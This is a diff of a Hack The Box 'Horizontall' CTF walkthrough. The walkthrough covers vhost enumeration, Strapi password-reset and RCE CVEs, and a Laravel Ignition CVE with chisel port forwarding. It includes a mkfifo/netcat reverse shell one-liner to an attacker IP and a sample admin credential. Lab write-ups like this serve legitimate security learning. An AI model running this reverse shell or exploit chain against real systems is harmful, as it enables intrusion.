@@ -1,7 +1,5 @@
 # Horizontall
 
-## Information Gathering
-
 The first thing I did was run a Rustscan on the target
 
 ```bash
@@ -26,17 +24,15 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-We add <mark style="color:green;">horizontall.htb</mark> to our <mark style="color:green;">/etc/hosts</mark> file since in the output we got "_Did not follow redirect to http://horizontall.htb_"
+We add <mark style="color:green;">horizontall.htb</mark> to our /etc/hosts file since in the output we got "_Did not follow redirect to http://horizontall.htb_"
 
-Searching on Google informs us that the latest version of <mark style="color:green;">nginx</mark> is <mark style="color:green;">1.21.6</mark> (mainline version) and <mark style="color:green;">1.20.2</mark> (stable version). We'll keep this in mind
+Searching on Google informs us that the latest version of nginx is 1.21.6 (mainline version) and 1.20.2 (stable version). We'll keep this in mind
 
 ![](<../../../.gitbook/assets/image (7).png>)
 
 Going to the site, we see a web page.
 
 ![](<../../../.gitbook/assets/image (36).png>)
-
-## Enumeration
 
 Viewing the source code and going through the site really did not provide anything useful. However, is it possible for the nginx server to have more vhosts? Using ffuf, we will see something
 
@@ -46,7 +42,7 @@ ffuf -u http://horizontall.htb -c -w /usr/share/seclists/Discovery/DNS/subdomain
 
 ![](<../../../.gitbook/assets/image (30).png>)
 
-After adding this subdomain to our /etc/hosts file, we head back over to the browser, for which we are presented with a basic welcome page
+Heading back over to the browser, we are presented with a basic welcome page
 
 ![](<../../../.gitbook/assets/image (42).png>)
 
@@ -68,25 +64,23 @@ Great! Now hopefully we can a version number somewhere
 
 ![](<../../../.gitbook/assets/image (16).png>)
 
-It seems the current version of <mark style="color:green;">Strapi</mark> is <mark style="color:green;">3.0.0-beta.17.4</mark>
+It seems the current version of Strapi is 3.0.0-beta.17.4
 
 ![](<../../../.gitbook/assets/image (37).png>)
 
-Using Searchsploit gives us some good news. An [RCE](https://www.exploit-db.com/exploits/50239)!
+Using searchsploit gives us some good news. An [RCE](https://www.exploit-db.com/exploits/50239)!
 
 ![](<../../../.gitbook/assets/image (58).png>)
 
-## Foothold
-
 According to [CVE-2019-18818](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-18818)
 
-> Strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js."
+> strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js."
 
 There's also [CVE-2019-19609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19609)
 
 > The Strapi framework before 3.0.0-beta.17.8 is vulnerable to Remote Code Execution in the Install and Uninstall Plugin components of the Admin panel, because it does not sanitize the plugin name, and attackers can inject arbitrary shell commands to be executed by the execa function.
 
-We run the exploit and then log into the using <mark style="color:green;">`admin:SuperStrongPassword1`</mark>
+We run the exploit and then login
 
 ![](<../../../.gitbook/assets/image (63).png>)
 
@@ -94,11 +88,11 @@ We run the exploit and then log into the using <mark style="color:green;">`admin
 
 Awesome! Now there's Plugin called "Files Upload", let's see if we can upload a file to get a reverse shell.&#x20;
 
-I tried multiple times to get a shell, but the output of the file yielded something like this:
+I tried multiple times to get a shell, but the output of following the file yielded something like this:
 
 ![](<../../../.gitbook/assets/image (69).png>)
 
-```bash
+```
 http://localhost:1337/uploads/0083c7ac6ed14dce9cc54821af03bf08.php
 ```
 
@@ -115,8 +109,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4444 >/tmp/f
 After upgrading my shell, I searched for the user.txt file
 
 ![](<../../../.gitbook/assets/image (46).png>)
-
-## More Enumeration
 
 I ran linepeas.sh and noticed something interesting. Looks like there is MySQL running and something else on port 8000. What is that port used for?
 
@@ -146,7 +138,7 @@ According to [CVE-2021-3129](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021
 
 > Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file\_get\_contents() and file\_put\_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.
 
-## Port Forwarding&#x20;
+#### Port Forwarding&#x20;
 
 Now to do some port forwarding. We'll use the [chisel ](https://github.com/jpillora/chisel)tool
 
@@ -169,7 +161,7 @@ Now when we go to <mark style="color:green;">`http://127.0.0.1:8000`</mark> in t
 
 ![](<../../../.gitbook/assets/image (49).png>)
 
-## Privilege Escalation
+#### Priv Esc
 
 Using the GitHub resource for the Laravel vulnerability, we'll execute the following command
 
@@ -183,9 +175,7 @@ Awesome! Now we can cat the root.txt file
 
 ![](<../../../.gitbook/assets/image (59).png>)
 
-This is nice, but a shell would be nicer
-
-Piping our python and netcat commands into /bin/bash technically works, but you won't see the output until stop the connection. So I decided to pipe that into another netcat call which worked better, although there may be a better solution
+This is nice, but a shell would be nicer :)
 
 ![](<../../../.gitbook/assets/image (18).png>)
 
